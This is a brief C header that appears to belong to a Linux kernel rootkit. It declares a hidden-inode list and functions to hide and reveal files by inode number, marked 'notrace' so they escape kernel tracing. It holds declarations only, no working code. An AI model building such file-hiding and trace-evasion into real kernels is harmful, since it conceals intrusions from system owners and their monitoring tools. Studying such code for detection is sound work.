#define ALL_PIDS 0
#define PARENT_PID -1

struct inode_list {
    unsigned long ino;
    struct list_head excluded_pids;
    struct list_head list;
};
extern struct list_head hidden_inodes;

notrace void hide_file_inode(unsigned long ino);
notrace int should_hide_inode(unsigned long ino);
notrace void show_file_inode(const void __user *user_info);